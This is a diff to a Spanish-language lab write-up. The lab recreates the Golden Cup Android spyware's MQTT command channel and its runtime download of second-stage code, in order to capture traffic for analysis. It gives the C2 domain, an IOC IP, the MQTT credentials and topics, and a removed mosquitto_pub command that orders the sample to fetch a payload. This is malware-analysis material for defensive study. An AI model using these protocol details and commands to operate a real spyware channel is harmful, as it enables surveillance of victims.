@@ -1,4 +1,4 @@
-Golden Cup es un programa espía para Android asociado a aplicaciones dirigidas a seguidores (principalmente militares Israelitas) de la Copa del Mundo 2018, como documentó Symantec en su [análisis de la campaña](https://symantec-enterprise-blogs.security.com/blogs/expert-perspectives/goldencup-new-cyber-threat-targeting-world-cup-fans). La muestra analizada contiene la primera etapa: establece un canal de mando mediante MQTT y puede recibir la URL de un segundo componente, descargarlo por HTTP y cargarlo dinámicamente. Esta cadena permite estudiar [**T1407 - Download New Code at Runtime**](https://attack.mitre.org/techniques/T1407/), técnica que MITRE atribuye a [Golden Cup (S0535)](https://attack.mitre.org/software/S0535/).
+Golden Cup es un programa espía para Android asociado a aplicaciones dirigidas a seguidores de la Copa Mundial, como documentó Symantec en su [análisis de la campaña](https://symantec-enterprise-blogs.security.com/blogs/expert-perspectives/goldencup-new-cyber-threat-targeting-world-cup-fans). La muestra analizada contiene la primera etapa: establece un canal de mando mediante MQTT y puede recibir la URL de un segundo componente, descargarlo por HTTP y cargarlo dinámicamente. Esta cadena permite estudiar [**T1407 - Download New Code at Runtime**](https://attack.mitre.org/techniques/T1407/), técnica que MITRE atribuye a [Golden Cup (S0535)](https://attack.mitre.org/software/S0535/).
 
 | Artefacto | Tipo | Identificación | SHA-256 |
 |---|---|---|---|
@@ -171,24 +171,14 @@ private final String PASSWORD = "4"
 
 Al no existir TLS, el paquete MQTT `CONNECT` permite observar estas credenciales y el identificador del cliente en la captura. El broker del laboratorio acepta conexiones anónimas para simplificar la ejecución, pero la muestra envía igualmente los campos de usuario y contraseña.
 
-La resolución se redirige mediante CoreDNS hacia `10.0.2.2`, dirección con la que un emulador Android alcanza al anfitrión. El `Corefile` responde tanto por el nombre completo como por el dominio base:
+En el laboratorio normalizado, el DNS controlado utiliza `10.230.35.53` y responde tanto por el nombre completo como por el dominio base. Los dos nombres se asocian a `107.175.144.26`, uno de los IOC IP que Symantec publica para la campaña Golden Cup. La referencia no vincula individualmente cada dirección con cada dominio; por ello, la asignación concreta a `goldncup.com` es una decisión documentada del laboratorio, mientras que el dominio y la pertenencia de la IP al conjunto de IOC proceden de la referencia.
 
 ```text
-.:53 {
-    errors
-    log
-    hosts {
-        10.0.2.2 www.goldncup.com goldncup.com
-        fallthrough
-    }
-}
+www.goldncup.com = 107.175.144.26
+goldncup.com = 107.175.144.26
 ```
 
-CoreDNS se inicia desde una terminal de PowerShell con privilegios de administrador:
-
-```powershell
-PS: .\coredns.exe -conf .\Corefile
-```
+La dirección pública se asigna exclusivamente al *namespace* aislado del C2. La topología no dispone de ruta por defecto y nunca intenta alcanzar al titular real de la dirección.
 
 Después de recibir un `CONNACK` satisfactorio, el cliente se suscribe con calidad de servicio 2 a todos los temas situados bajo su espacio de órdenes:
 
@@ -378,7 +368,7 @@ sequenceDiagram
     participant H as "Servidor HTTP"
 
     V->>D: Consulta A de www.goldncup.com
-    D-->>V: Respuesta A con 10.0.2.2
+    D-->>V: Respuesta A con 107.175.144.26
     V->>M: TCP/1883 y MQTT CONNECT con identificador y credenciales
     M-->>V: CONNACK satisfactorio
     par Suscripción a órdenes
@@ -395,31 +385,20 @@ sequenceDiagram
 
 ### Laboratorio de generación del PCAP
 
-El laboratorio ejecuta la APK original en un dispositivo virtual Android con API 21. CoreDNS resuelve `www.goldncup.com` hacia `10.0.2.2`; Mosquitto recibe la sesión MQTT en el puerto 1883; y `http_server.py` genera un contenedor `.data` inocuo con la estructura esperada. El ZIP interno contiene una entrada llamada `out.dex`, pero, salvo que se proporcione un DEX benigno mediante `--dex`, su contenido es únicamente un marcador inerte.
+El laboratorio ejecuta la APK original en el AVD `golden_api21_aosp`, basado en Android API 21. Android Emulator permanece en Windows y Kali WSL aloja las entidades controladas.
 
-No es necesario instalar una autoridad de certificación: tanto MQTT como HTTP circulan sin TLS. En Windows, la captura sobre la interfaz de loopback puede mostrar `127.0.0.1` como extremo IP aunque la respuesta DNS entregada al emulador contenga `10.0.2.2`.
+| Entidad | Dirección y servicio | Procedencia |
+|---|---|---|
+| DNS controlado | `10.230.35.53:53` | Dirección privada asignada al resolutor del laboratorio. |
+| C2 de Golden Cup | `107.175.144.26:1883` y `107.175.144.26:80` | IOC publicado por Symantec en el [análisis de Golden Cup](https://symantec-enterprise-blogs.security.com/blogs/expert-perspectives/goldencup-new-cyber-threat-targeting-world-cup-fans). El DNS lo entrega para `goldncup.com`; MQTT y HTTP comparten la misma entidad. |
+| Operador MQTT | `10.230.35.20` | Dirección privada asignada al participante que publica la orden. No es un IOC ni se anuncia a la muestra. |
 
-Con CoreDNS ya iniciado, el broker se lanza desde una segunda terminal de PowerShell:
+El fichero `mqtt-server.conf` del laboratorio original se ha trasladado al pipeline. Mosquitto sigue aceptando la sesión real de Eclipse Paho, incluidas las credenciales, el identificador, la sesión persistente y los intercambios QoS 2. El servidor HTTP original también se conserva: genera un contenedor `.data` con AES-ECB, introduce la clave de 32 bytes en la posición esperada y encapsula una entrada `out.dex`. Por defecto, dicha entrada es un marcador inerte, no un DEX ejecutable.
 
-```powershell
-PS: & "C:\Program Files\mosquitto\mosquitto.exe" -c .\mqtt-server.conf -v
-```
+Una entidad de operador se suscribe a `RT/AP/+/I/A` antes de que arranque el AVD. Cuando recibe `ON`, obtiene el identificador real del cliente, espera a que finalice la suscripción de la APK y publica con QoS 2 la URL recién generada en `RT/SV/<client-id>/C/a`. A continuación espera el acuse `RT/AP/<client-id>/I/B`. Esta automatización reproduce las órdenes manuales del laboratorio original sin inventar mensajes ni fijar de antemano el identificador o el valor Adler-32.
 
-El servidor HTTP se ejecuta en otra terminal. El identificador permite que el propio servidor muestre el comando de publicación correspondiente:
+No es necesario instalar una autoridad de certificación: DNS, MQTT y HTTP circulan sin TLS. La clave AES forma parte del contenedor descargado y no es material de descifrado de la sesión de red.
 
-```powershell
-PS: python .\http_server.py --client-id 51111110635824006
-```
+Este escenario está incorporado en `python-labnet` con el identificador `goldencup`. La preparación de la topología, el arranque manual del AVD, la captura interactiva y la retirada del entorno se describen en la [guía central de laboratorios Android](Laboratorios%20Android.md).
 
-El servidor imprime la URL exacta del artefacto generado. Después de observar la suscripción `RT/SV/51111110635824006/#`, se publica la orden de descarga desde una terminal adicional. Si el nombre generado difiere, debe sustituirse `stage_1725773520.data` por el mostrado por `http_server.py`:
-
-```powershell
-PS: & "C:\Program Files\mosquitto\mosquitto_pub.exe" `
->>   -h 127.0.0.1 `
->>   -p 1883 `
->>   -q 2 `
->>   -t "RT/SV/51111110635824006/C/a" `
->>   -m "http://www.goldncup.com/payloads/stage_1725773520.data"
-```
-
-La evidencia esperada comprende la consulta DNS, el `CONNECT` y la suscripción MQTT, la publicación de estado, la orden `C/a`, la petición HTTP del fichero `.data`, la respuesta `200 OK` y, cuando la extracción deja un único DEX, el acuse `YES`. Una PCAP que contenga esta cadena demuestra la entrega del nuevo código; la ejecución de `out.dex` debe corroborarse mediante evidencia local y no se deduce únicamente de la captura.
+La evidencia esperada comprende la consulta DNS que responde `107.175.144.26`, el `CONNECT` y la suscripción MQTT, la publicación de estado, la orden `C/a`, la petición HTTP del fichero `.data`, la respuesta `200 OK` y, cuando la extracción deja un único DEX, el acuse `YES`. Una PCAP que contenga esta cadena demuestra la entrega del nuevo código; la ejecución de `out.dex` debe corroborarse mediante evidencia local y no se deduce únicamente de la captura.
